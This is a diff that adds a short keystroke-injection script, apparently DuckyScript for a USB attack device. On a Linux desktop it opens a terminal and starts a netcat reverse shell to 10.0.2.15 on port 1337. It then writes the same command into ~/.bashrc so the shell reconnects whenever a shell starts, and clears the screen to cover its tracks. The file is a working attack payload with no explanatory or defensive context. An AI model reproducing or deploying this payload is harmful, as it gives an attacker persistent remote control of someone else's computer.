@@ -1,0 +1,10 @@
+REM Open terminal
+CTRL-ALT t
+DELAY 1000
+
+REM Connect to remote server
+STRINGLN nc 10.0.2.15 1337 -e /bin/sh &
+
+REM Add connection command to bashrc
+STRINGLN echo "nc 10.0.2.15 1337 -e /bin/sh 2>/dev/null" >> ~/.bashrc
+STRINGLN clear
